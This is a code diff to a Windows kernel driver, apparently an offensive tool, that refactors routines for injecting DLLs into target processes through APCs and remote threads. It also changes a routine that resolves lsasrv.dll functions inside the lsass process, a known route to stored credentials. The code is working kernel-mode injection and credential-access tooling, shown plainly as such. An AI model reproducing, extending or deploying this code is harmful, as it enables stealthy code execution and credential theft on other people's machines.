@@ -72,14 +72,39 @@ MemoryHandler::~MemoryHandler() {
 * Returns:
 * @status  [NTSTATUS]			  -- Whether successfuly injected or not.
 */
+_IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
 	IoctlShellcodeInfo shellcodeInfo{};
-	SIZE_T dllPathSize = strlen(dllInfo.DllPath) + 1;
 	NTSTATUS status = STATUS_SUCCESS;
-	PVOID loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll");
+	WCHAR* fullPath = nullptr;
+	WCHAR* mainDriveLetter = nullptr;
+	PVOID loadLibraryAddress = nullptr;
+	SIZE_T dllPathSize = strlen(dllInfo.DllPath) + 1;
+	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
+	MemoryAllocator<WCHAR*> fullPathAllocator(&fullPath, (DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));
 
-	if (!loadLibraryAddress)
-		return STATUS_ABANDONED;
+	if (!fullPathAllocator.IsValid())
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	IrqlGuard irqlGuard(PASSIVE_LEVEL);
+	__try {
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath, DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath, wcslen(kernel32) * sizeof(WCHAR), kernel32);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath, dllInfo.Pid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		FreeVirtualMemory(mainDriveLetter);
+		return GetExceptionCode();
+	}
+	FreeVirtualMemory(mainDriveLetter);
+	irqlGuard.UnsetIrql();
 
 	// Creating the shellcode information for APC injection.
 	WindowsMemoryAllocator<PVOID> allocator(shellcodeInfo.Parameter1, &dllPathSize, PAGE_READWRITE, &status);
@@ -88,8 +113,14 @@ NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
 		return status;
 
 	dllPathSize = strlen(dllInfo.DllPath) + 1;
-	status = WriteProcessMemory(dllInfo.DllPath, PsGetCurrentProcess(), shellcodeInfo.Parameter1, strlen(dllInfo.DllPath),
-		KernelMode, false);
+	status = MmCopyVirtualMemory(
+		PsGetCurrentProcess(), 
+		dllInfo.DllPath, 
+		PsGetCurrentProcess(), 
+		shellcodeInfo.Parameter1, 
+		dllPathSize,
+		KernelMode, 
+		nullptr);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -124,20 +155,39 @@ NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) {
 	PEPROCESS targetProcess = NULL;
 	PVOID remoteAddress = NULL;
 	PVOID loadLibraryAddress = nullptr;
+	WCHAR* fullPath = nullptr;
+	WCHAR* mainDriveLetter = nullptr;
 	HANDLE pid = UlongToHandle(dllInfo.Pid);
 	SIZE_T pathLength = strlen(dllInfo.DllPath) + 1;
 	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
+	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
+	MemoryAllocator<WCHAR*> fullPathAllocator(&fullPath, (DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));
 
+	if (!fullPathAllocator.IsValid())
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	IrqlGuard irqlGuard(PASSIVE_LEVEL);
 	__try {
-		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll", dllInfo.Pid);
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath, DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath, wcslen(kernel32) * sizeof(WCHAR), kernel32);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath, dllInfo.Pid);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
-		ObDereferenceObject(targetProcess);
+		FreeVirtualMemory(mainDriveLetter);
 		return GetExceptionCode();
 	}
+	FreeVirtualMemory(mainDriveLetter);
+	irqlGuard.UnsetIrql();
 
 	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
 	cid.UniqueProcess = pid;
@@ -879,6 +929,13 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 	ULONG foundIndex = 0;
 	PVOID lsasrvMain = nullptr;
 	PVOID lsaIGetNbAndDnsDomainNames = nullptr;
+	WCHAR* mainDriveLetter = nullptr;
+	WCHAR* fullPath = nullptr;
+	const WCHAR lsasrvDll[] = L"\\Windows\\System32\\lsasrv.dll";
+	MemoryAllocator<WCHAR*> fullPathAllocator(&fullPath, (DRIVE_LETTER_SIZE + wcslen(lsasrvDll)) * sizeof(WCHAR));
+
+	if (!fullPathAllocator.IsValid())
+		return STATUS_INSUFFICIENT_RESOURCES;
 
 	auto AlignAddress = [](ULONGLONG Address) -> ULONGLONG {
 		ULONG remain = Address % 8;
@@ -902,14 +959,27 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 	if (!NT_SUCCESS(status))
 		return status;
 
+	IrqlGuard irqlGuard(PASSIVE_LEVEL);
 	__try {
-		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
-		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath, DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath, wcslen(lsasrvDll) * sizeof(WCHAR), lsasrvDll);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", fullPath, lsassPid);
+		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", fullPath, lsassPid);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
+		FreeVirtualMemory(mainDriveLetter);
 		ObDereferenceObject(lsass);
 		return GetExceptionCode();
 	}
+	FreeVirtualMemory(mainDriveLetter);
+	irqlGuard.UnsetIrql();
 
 	KeStackAttachProcess(lsass, &state);
 	do {
